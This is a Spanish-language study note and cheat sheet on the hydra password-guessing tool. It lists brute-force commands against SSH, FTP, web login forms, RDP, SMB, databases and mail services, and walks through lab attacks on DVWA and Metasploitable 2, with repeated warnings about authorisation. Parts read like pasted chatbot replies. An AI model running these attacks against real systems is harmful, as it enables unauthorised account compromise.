![[header_ethical_hacking.jpg]]
# Comando `hydra`

---
**Tags:** #info #hacking #tool #kali #linux #bash

> [!info] Volver a [[Home]] | [[Ciberseguridad]] 

---
## Descripción

El comando `hydra` es una herramienta de prueba de penetración diseñada para realizar ataques de fuerza bruta y diccionario en diversos protocolos y servicios, con el objetivo de identificar contraseñas débiles o vulnerabilidades de autenticación. `hydra` es una herramienta versátil y ampliamente utilizada en el ámbito de la seguridad cibernética para evaluar la robustez de los sistemas y aplicaciones.

`hydra` se puede utilizar con una variedad de protocolos y servicios, y ofrece opciones avanzadas para personalizar los ataques y adaptarse a las necesidades específicas. Sin embargo, es importante recordar que realizar pruebas de fuerza bruta sin permiso adecuado puede ser ilegal y causar daños, por lo que es crucial utilizar esta herramienta de manera ética y en entornos autorizados.

## Casos de Uso y Ejemplos

1. **Ataque de Fuerza Bruta en SSH:**
   Intenta adivinar contraseñas de una cuenta SSH en un servidor remoto:

   ```bash
   hydra -l username -P /path/to/passwords.txt ssh://target_ip
   ```

2. **Ataque de Diccionario en FTP:**
   Realiza un ataque de diccionario en un servidor FTP:

   ```bash
   hydra -l username -P /path/to/passwords.txt ftp://target_ip
   ```

3. **Ataque de Fuerza Bruta en HTTP POST:**
   Intenta adivinar una contraseña en un formulario web utilizando solicitudes HTTP POST:

   ```bash
   hydra -l username -P /path/to/passwords.txt http-post://target_url/form:username=^USER^&password=^PASS^:F=Invalid
   ```

4. **Ataque de Fuerza Bruta en RDP:**
   Prueba contraseñas en un servicio de Escritorio Remoto (RDP):

   ```bash
   hydra -t 4 -l username -P /path/to/passwords.txt rdp://target_ip
   ```

5. **Ataque de Fuerza Bruta en MySQL:**
   Intenta adivinar la contraseña de una cuenta de MySQL:

   ```bash
   hydra -l username -P /path/to/passwords.txt mysql://target_ip
   ```

6. **Ataque de Fuerza Bruta en SMB (Windows):**
   Realiza un ataque de fuerza bruta en el protocolo SMB de Windows:

   ```bash
   hydra -l username -P /path/to/passwords.txt smb://target_ip
   ```

7. **Ataque de Fuerza Bruta en Telnet:**
   Intenta adivinar contraseñas en el protocolo Telnet:

   ```bash
   hydra -l username -P /path/to/passwords.txt telnet://target_ip
   ```

8. **Ataque de Fuerza Bruta en VNC:**
   Prueba contraseñas en el protocolo VNC:

   ```bash
   hydra -l username -P /path/to/passwords.txt vnc://target_ip
   ```

9. **Ataque de Fuerza Bruta en Servicio POP3:**
   Intenta adivinar contraseñas en el servicio POP3 (correo electrónico):

   ```bash
   hydra -l username -P /path/to/passwords.txt pop3://target_ip
   ```

10. **Ataque de Fuerza Bruta en SMTP:**
    Prueba contraseñas en el protocolo SMTP (correo saliente):

   ```bash
   hydra -l username -P /path/to/passwords.txt smtp://target_ip
   ```

11. **Ataque de Fuerza Bruta en HTTP Basic Authentication:**
    Realiza un ataque en autenticación HTTP básica:

   ```bash
   hydra -l username -P /path/to/passwords.txt http-get://target_url
   ```

12. **Ataque de Fuerza Bruta en LDAP:**
    Intenta adivinar contraseñas en el protocolo LDAP:

   ```bash
   hydra -l username -P /path/to/passwords.txt ldap2://target_ip
   ```

13. **Ataque de Fuerza Bruta en HTTP POST con Cookies:**
    Realiza un ataque de fuerza bruta en una solicitud HTTP POST con cookies:

   ```bash
   hydra -l username -P /path/to/passwords.txt http-post://target_url/form:username=^USER^&password=^PASS^:F=Invalid -C /path/to/cookies.txt
   ```

14. **Ataque de Fuerza Bruta en RADIUS:**
    Prueba contraseñas en el protocolo RADIUS (autenticación en red):

   ```bash
   hydra -l username -P /path/to/passwords.txt radius://target_ip
   ```

15. **Ataque de Fuerza Bruta en SNMP:**
    Intenta adivinar contraseñas en el protocolo SNMP (monitoreo de red):

   ```bash
   hydra -L /path/to/usernames.txt -P /path/to/passwords.txt snmp://target_ip
   ```

16. **Ataque de Fuerza Bruta en SSH utilizando una Lista de Usuarios:**
    Prueba contraseñas en SSH utilizando una lista de usuarios:

   ```bash
   hydra -L /path/to/usernames.txt -P /path/to/passwords.txt ssh://target_ip
   ```

Recuerda que el uso de `hydra` debe realizarse de manera ética y en entornos controlados con el permiso adecuado. Utilizar esta herramienta en sistemas en producción sin autorización puede tener consecuencias legales y de seguridad.

---
## Otros ejemplos contra DVWA

Por supuesto, aquí tienes más ejemplos de cómo utilizar la herramienta `hydra` en combinación con los entornos DVWA (Damn Vulnerable Web Application) y Metasploitable 2:

**Fuerza Bruta en DVWA:**

1. **Fuerza Bruta en Login con DVWA:**
   Realiza un ataque de fuerza bruta en el formulario de inicio de sesión de DVWA:

   ```bash
   hydra -l admin -P /path/to/passwords.txt 192.168.1.10 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
   ```

2. **Fuerza Bruta en DVWA con CSRF Token:**
   Prueba contraseñas en DVWA, donde se requiere un token CSRF:

   ```bash
   hydra -l admin -P /path/to/passwords.txt 192.168.1.10 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&user_token=YOUR_CSRF_TOKEN:Username and/or password incorrect."
   ```

**Fuerza Bruta en Metasploitable 2:**

3. **Fuerza Bruta en SSH de Metasploitable 2:**
   Intenta adivinar contraseñas en el servicio SSH de Metasploitable 2:

   ```bash
   hydra -l msfadmin -P /path/to/passwords.txt 192.168.1.20 ssh
   ```

4. **Fuerza Bruta en FTP de Metasploitable 2:**
   Realiza un ataque de fuerza bruta en el servicio FTP de Metasploitable 2:

   ```bash
   hydra -l msfadmin -P /path/to/passwords.txt 192.168.1.20 ftp
   ```

5. **Fuerza Bruta en Telnet de Metasploitable 2:**
   Prueba contraseñas en el protocolo Telnet de Metasploitable 2:

   ```bash
   hydra -l msfadmin -P /path/to/passwords.txt 192.168.1.20 telnet
   ```

6. **Fuerza Bruta en RDP de Metasploitable 2:**
   Intenta adivinar contraseñas en el servicio de Escritorio Remoto (RDP) de Metasploitable 2:

   ```bash
   hydra -l msfadmin -P /path/to/passwords.txt 192.168.1.20 rdp
   ```

Estos ejemplos te proporcionan una idea de cómo puedes utilizar `hydra` en combinación con los entornos DVWA y Metasploitable 2 para probar la seguridad de servicios y aplicaciones en entornos controlados. Siempre ten en cuenta que realizar pruebas de fuerza bruta sin el permiso adecuado es ilegal y puede tener consecuencias graves.

---
## Ejemplo de comando contra DVWA

El comando que proporcionaste utiliza la herramienta Hydra para realizar un ataque de fuerza bruta a través de una solicitud HTTP POST en un formulario de inicio de sesión. A continuación, te explico cada componente del comando:

- `hydra`: Es el comando principal de la herramienta Hydra, que se utiliza para realizar ataques de fuerza bruta y diccionario.

- `10.0.2.8`: Es la dirección IP del objetivo al que se dirigirá el ataque.

- `-l admin`: Especifica el nombre de usuario que se utilizará en el ataque. En este caso, el nombre de usuario es "admin".

- `-P claves.txt`: Indica el archivo de texto que contiene las contraseñas que se probarán durante el ataque. Cada línea del archivo representa una contraseña.

- `http-post-form`: Especifica que se realizará un ataque de fuerza bruta utilizando una solicitud HTTP POST en un formulario.

- `"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=failed"`: Esta parte del comando define la estructura de la solicitud HTTP POST que se utilizará en el ataque. Aquí está desglosado:

  - `"/dvwa/login.php"`: Es la URL del formulario de inicio de sesión al que se dirigirá la solicitud POST.
  
  - `username=^USER^&password=^PASS^&Login=Login`: Son los campos del formulario y sus valores. `^USER^` y `^PASS^` son marcadores que Hydra reemplazará con el nombre de usuario y la contraseña en cada intento.
  
  - `F=failed`: Indica cómo detectar un inicio de sesión fallido. En este caso, se busca la cadena "failed" en la respuesta.

En resumen, este comando utiliza Hydra para realizar un ataque de fuerza bruta en un formulario de inicio de sesión en la URL `/dvwa/login.php`. Se intentarán diferentes contraseñas del archivo `claves.txt` para el usuario "admin", y se buscará la cadena "failed" en las respuestas para identificar intentos fallidos de inicio de sesión.

---

